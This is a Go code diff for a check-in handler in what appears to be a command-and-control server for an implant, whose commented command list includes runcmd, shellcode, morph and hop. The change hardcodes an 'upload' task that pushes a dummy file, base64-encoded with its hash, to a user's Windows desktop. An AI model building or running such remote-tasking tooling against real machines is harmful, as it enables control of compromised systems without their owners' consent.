@@ -28,56 +28,35 @@ func CheckinHandler(w http.ResponseWriter, r *http.Request) {
 	response.TaskAvailable = true
 	response.TaskID = generateTaskID()
 
-	// Randomly select a command.
-	commands := []string{"hop"}
+	// Randomly select a command (this is just a temp way to test before integrating client that will issue commands intentionally)
+	commands := []string{"upload"}
 	response.Command = commands[0]
 
 	//commands := []string{"runcmd", "upload", "download", "enumerate", "shellcode", "morph", "hop", "doesnotexist"}
 	//response.Command = commands[seededRand.Intn(len(commands))]
 
 	// HERE WE CREATE response.Data, UPLOAD SPECIFIC ARGUMENTS
+	fileBytes, err := os.ReadFile("./dummy/dummy.txt")
+	if err != nil {
+		panic(fmt.Errorf("failed to read prerequisite file: %w", err))
+	}
+	hashBytes := sha256.Sum256(fileBytes)
 
-	response.Data = models.UploadArgs{
-		TargetDirectory: "C:\\Users\\vuilhond\\Desktop\\",
-		TargetFilename:  "dummy.txt",
-		FileContentBase64: func() string {
-			fileBytes, err := os.ReadFile("./dummy/dummy.txt")
-			if err != nil {
-				panic(fmt.Errorf("failed to read prerequisite file ./dummy/dummy.txt: %w", err))
-			}
-			return base64.StdEncoding.EncodeToString(fileBytes)
-		}(),
-		ExpectedSha256: func() string {
-			fileBytes, err := os.ReadFile("./dummy/dummy.txt")
-			if err != nil {
-				fmt.Println(err)
-			}
-			hashBytes := sha256.Sum256(fileBytes)
-			return fmt.Sprintf("%x", hashBytes)
-		}(),
+	uploadArguments := models.UploadArgs{
+		TargetDirectory:   "C:\\Users\\vuilhond\\Desktop\\",
+		TargetFilename:    "dummy.txt",
+		FileContentBase64: base64.StdEncoding.EncodeToString(fileBytes),
+		ExpectedSha256:    fmt.Sprintf("%x", hashBytes),
 		OverwriteIfExists: true,
 	}
 
-	// Assert that response.Data holds a models.UploadArgs struct.
-	if uploadArgs, ok := response.Data.(models.UploadArgs); ok {
-		// If 'ok' is true, the assertion succeeded.
-		// 'uploadArgs' is now a variable of the correct type (models.UploadArgs).
-		fmt.Printf("EXPLICIT DEBUG TO REVIEW ARGUMENTS\n"+
-			"TargetDirectory: %s\n"+
-			"TargetFilename: %s\n"+
-			"FileContentBase64: %s\n"+
-			"ExpectedSha256: %s\n"+
-			"OverwriteIfExists: %v\n",
-			uploadArgs.TargetDirectory,
-			uploadArgs.TargetFilename,
-			uploadArgs.FileContentBase64,
-			uploadArgs.ExpectedSha256,
-			uploadArgs.OverwriteIfExists,
-		)
-	} else {
-		// This will run if response.Data does not contain a models.UploadArgs.
-		fmt.Println("Error: response.Data is not the expected UploadArgs type")
+	uploadArgsJSON, err := json.Marshal(uploadArguments)
+	if err != nil {
+		log.Printf("Failed to marshal upload args: %v", err)
+		http.Error(w, "Internal server error", http.StatusInternalServerError)
+		return
 	}
+	response.Data = uploadArgsJSON
 
 	// HERE UPLOAD SPECIFIC ARGUMENTS END
 
